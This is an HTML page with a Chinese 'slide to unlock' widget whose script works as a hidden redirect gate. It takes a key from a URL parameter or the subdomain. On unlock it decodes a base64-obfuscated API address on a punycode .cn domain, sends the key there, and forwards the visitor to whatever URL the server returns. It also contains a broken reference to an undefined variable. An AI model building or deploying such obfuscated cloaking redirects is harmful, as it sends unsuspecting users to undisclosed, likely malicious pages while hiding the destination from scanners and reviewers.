<!DOCTYPE html>
<html lang="zh-cn">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">
  <meta name="referrer" content="no-referrer">
  <style>
    *{margin:0;padding:0;box-sizing:border-box;font-family:'Helvetica Neue',Arial,sans-serif;}
    html,body{height:100%;overflow:hidden;}
    body{display:flex;justify-content:center;align-items:center;background:#f3f6fb;}

    .slider-container {
      width:300px;
      padding:30px 20px;
      background:white;
      border-radius:15px;
      box-shadow:0 10px 30px rgba(74,137,220,0.1);
      text-align:center;
      position:relative;
    }
    .slider-track {
      width:56px;height:250px;
      background:#e0ebff;
      border-radius:28px;
      position:relative;
      margin:0 auto 40px;
      padding:24px 0;
    }
    .slider-progress {
      width:16px;height:0;
      background:linear-gradient(to top,#2196F3,#00BCD4);
      border-radius:8px;
      position:absolute;
      bottom:24px;
      left:50%;transform:translateX(-50%);
      transition:height 0.1s;
    }
    .slider-thumb {
      width:48px;height:48px;
      background:linear-gradient(135deg,#2196F3,#00BCD4);
      border-radius:50%;
      position:absolute;
      bottom:0;left:50%;
      transform:translateX(-50%);
      cursor:pointer;
      box-shadow:0 4px 12px rgba(74,137,220,0.3);
      display:flex;justify-content:center;align-items:center;
      transition:transform 0.2s;
      z-index:2;
      animation:idlePulse 2s infinite ease-in-out;
    }
    .slider-thumb::after {
      content:"‚Üë";color:white;font-size:18px;
    }
    .slider-thumb.active { transform:translateX(-50%) scale(1.1); }

    @keyframes idlePulse {
      0%,100%{transform:translateX(-50%) scale(1);}
      50%{transform:translateX(-50%) scale(1.05);}
    }

    .unlock-hint{color:#7fa8eb;font-size:14px;transition:all 0.3s;}
    .confetti {
      position:absolute;width:6px;height:6px;background:white;
      opacity:0;animation:confetti 1s ease-out forwards;
    }
    @keyframes confetti {
      0%{transform:translate(0,0) rotate(0deg);opacity:1;}
      100%{transform:translate(var(--tx),var(--ty)) rotate(360deg);opacity:0;}
    }
  </style>
</head>
<body>
  <div class="slider-container">
    <div class="slider-track" id="sliderTrack">
      <div class="slider-progress" id="sliderProgress"></div>
      <div class="slider-thumb" id="sliderThumb"></div>
    </div>
    <div class="unlock-hint" id="unlockHint">ËØ∑Âêë‰∏äÊªëÂä®ÂúÜÂΩ¢ÊªëÂùó</div>
  </div>

  <script>
    const thumb = document.getElementById("sliderThumb");
    const track = document.getElementById("sliderTrack");
    const progress = document.getElementById("sliderProgress");
    const hint = document.getElementById("unlockHint");

    let isDragging = false;
    let startY = 0;
    let trackRect = track.getBoundingClientRect();
    let maxDistance = trackRect.height - 48; // ÊúÄÂ§ßÊªëÂä®È´òÂ∫¶

    function updateTrackSize() {
      trackRect = track.getBoundingClientRect();
      maxDistance = trackRect.height - 48;
    }
    window.addEventListener("resize", updateTrackSize);

    thumb.addEventListener("mousedown", startDrag);
    thumb.addEventListener("touchstart", startDrag);

    function startDrag(e) {
      isDragging = true;
      startY = (e.touches ? e.touches[0].clientY : e.clientY);
      thumb.classList.add("active");

      document.addEventListener("mousemove", onDrag);
      document.addEventListener("touchmove", onDrag);
      document.addEventListener("mouseup", endDrag);
      document.addEventListener("touchend", endDrag);
    }

    function onDrag(e) {
      if (!isDragging) return;
      const clientY = (e.touches ? e.touches[0].clientY : e.clientY);
      let moveY = startY - clientY; // Âêë‰∏ä‰∏∫Ê≠£
      if (moveY < 0) moveY = 0;
      if (moveY > maxDistance) moveY = maxDistance;

      thumb.style.bottom = moveY + "px";
      progress.style.height = moveY + "px";

      if (moveY / maxDistance > 0.7) {
        hint.innerText = "ÊùæÂºÄËß£ÈîÅ";
      } else {
        hint.innerText = "ËØ∑ÁªßÁª≠ÊªëÂä®";
      }
    }

    function endDrag() {
      if (!isDragging) return;
      isDragging = false;
      thumb.classList.remove("active");

      let distance = parseFloat(thumb.style.bottom) || 0;
      if (distance / maxDistance >= 0.95) {
        unlockSuccess();
      } else {
        // ÂõûÂà∞ÂàùÂßã
        thumb.style.bottom = "0px";
        progress.style.height = "0px";
        hint.innerText = "ËØ∑Âêë‰∏äÊªëÂä®ÂúÜÂΩ¢ÊªëÂùó";
      }

      document.removeEventListener("mousemove", onDrag);
      document.removeEventListener("touchmove", onDrag);
      document.removeEventListener("mouseup", endDrag);
      document.removeEventListener("touchend", endDrag);
    }

          
function GetQueryString(name) {
  const query = window.location.href.split('?')[1];
  if (!query) return null;
  const reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)");
  const r = query.match(reg);
  if (r != null) return decodeURIComponent(r[2]);
  return null;
}

// Ëé∑ÂèñÂèÇÊï∞ÂêçÈïøÂ∫¶‰∏∫2ÁöÑÂáΩÊï∞
function GetFirstParamValue() {
  const query = window.location.href.split('?')[1];
  if (!query) return null;
  
  // Ëé∑ÂèñÊâÄÊúâÂèÇÊï∞
  const params = query.split('&');
  
  // ÈÅçÂéÜÊâÄÊúâÂèÇÊï∞ÔºåÊâæÂà∞ÂèÇÊï∞ÂêçÈïøÂ∫¶‰∏∫2ÁöÑÂèÇÊï∞
  for (let param of params) {
    if (param.includes('=')) {
      // Ê≠£Â∏∏ÂèÇÊï∞Ê†ºÂºèÔºöname=value
      const name = param.split('=')[0];
      if (name && name.length === 2) {
        const value = param.split('=')[1];
        return decodeURIComponent(value);
      }
    } else {
      // Áõ¥Êé•ÂÄºÊ†ºÂºèÔºövalueÔºàÊ≤°ÊúâÂèÇÊï∞ÂêçÔºâÔºåË∑≥Ëøá
      continue;
    }
  }
  
  return null;
}

// Ëé∑ÂèñÂèÇÊï∞
const bucket = GetQueryString("bucket");
let str = GetFirstParamValue(); // Ëé∑ÂèñÁ¨¨‰∏Ä‰∏™ÂèÇÊï∞ÂÄº‰Ωú‰∏∫ic
// Â¶ÇÊûú str ‰∏∫Á©∫ÔºåÂ∞ùËØï‰ªéÂüüÂêçËß£Êûê
if (!str) {
  let rawHost = document.domain || '';
  if (!rawHost || rawHost === rawHost.toLowerCase()) {
    const urlMatch = window.location.href.match(/^https?:\/\/([^\/?#:]+)/);
    if (urlMatch && urlMatch[1]) {
      rawHost = urlMatch[1];
    }
  }
  const dotIndex = rawHost.indexOf('.');
  if (dotIndex > 0) {
    str = rawHost.substring(0, dotIndex);
  }
}
 
 const newstr = str.slice(0, 8)
    if(newstr.length != 8){ 
        alink.onclick = function() {
            window.location = 'https://m.jd.com'; 
        } 
     } 
const sign = Date.now();

    function unlockSuccess() {
      thumb.style.bottom = maxDistance + "px";
      progress.style.height = maxDistance + "px";
      hint.innerText = "Ëß£ÈîÅÊàêÂäüÔºÅ üéâ";
      createConfetti();
  
      // TODO: Âú®ËøôÈáåÂÜôÊàêÂäüÂêéÁöÑÈÄªËæëÔºå‰æãÂ¶ÇË∑≥ËΩ¨ÊàñÂä†ËΩΩÊï∞ÊçÆ
      setTimeout(()=>{ 
            const params = new URLSearchParams();
            params.append('bucket', bucket);
            params.append('keys', newstr);
            params.append('sign', sign);
            const apiUrl = "Ly9kZmR3emFwaS54bi0teXZzdjUwYXd1bDE0bS5jbi9hcGkvcmVhZC9jYQ";
            const baseUrl = atob(apiUrl);
                            
            fetch(baseUrl + '?' + params.toString())
            .then(res => res.json())
            .then(data => {
                if (data.code === 200) {
                            window.location.href = data.url;
                        
                } else {
                        //  window.location.reload();
                }
                
            })
            .catch(err => {
                setTimeout(() => { window.location.reload(); }, 1500);
            });
            
            
 
    }, 500);
    }

    function createConfetti() {
      for (let i=0;i<30;i++){
        const c=document.createElement("div");
        c.className="confetti";
        c.style.left="50%";c.style.top="50%";
        c.style.setProperty("--tx",(Math.random()*400-200)+"px");
        c.style.setProperty("--ty",(Math.random()*400-200)+"px");
        document.body.appendChild(c);
        setTimeout(()=>c.remove(),1000);
      }
    }
  </script>
</body>
</html>
